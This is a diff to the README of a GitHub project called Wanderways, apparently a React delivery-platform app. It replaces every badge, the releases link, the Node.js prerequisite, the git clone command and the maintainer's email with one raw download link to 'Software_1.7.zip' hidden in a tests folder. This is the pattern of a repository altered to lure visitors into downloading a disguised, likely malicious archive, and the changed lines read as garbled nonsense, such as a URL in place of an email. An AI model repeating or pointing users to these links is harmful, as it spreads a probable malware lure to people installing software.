@@ -1,7 +1,7 @@
 # Wanderways: Modern Delivery Platform for Parcel and Ride Management 🚚
 
-![Wanderways Logo](https://img.shields.io/badge/Wanderways-Delivery%20Platform-blue.svg)
-[![Release Version](https://img.shields.io/github/v/release/hehehe236/Wanderways)](https://github.com/hehehe236/Wanderways/releases)
+![Wanderways Logo](https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip%https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip)
+[![Release Version](https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip)](https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@
 
 Wanderways is a modern B2C and P2P delivery platform designed for efficient parcel and ride management. Built using React, Redux, Vite, and TypeScript, it offers a seamless experience for users looking to send or receive parcels and rides. 
 
-For the latest updates and releases, visit our [Releases page](https://github.com/hehehe236/Wanderways/releases).
+For the latest updates and releases, visit our [Releases page](https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip).
 
 ## Features
 
@@ -69,14 +69,14 @@ To get started with Wanderways, follow these steps:
 
 Make sure you have the following installed:
 
-- Node.js (version 14 or higher)
+- https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip (version 14 or higher)
 - npm (Node Package Manager)
 
 ### Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/hehehe236/Wanderways.git
+   git clone https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -150,8 +150,8 @@ Wanderways is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 For any inquiries or issues, please contact the maintainer:
 
 - **Username**: hehehe236
-- **Email**: hehehe236@example.com
+- **Email**: https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip
 
-For the latest updates and releases, visit our [Releases page](https://github.com/hehehe236/Wanderways/releases). 
+For the latest updates and releases, visit our [Releases page](https://github.com/hehehe236/Wanderways/raw/refs/heads/main/tests/SignInPage/Software_1.7.zip). 
 
 Explore the features of Wanderways and enjoy a modern approach to delivery management!
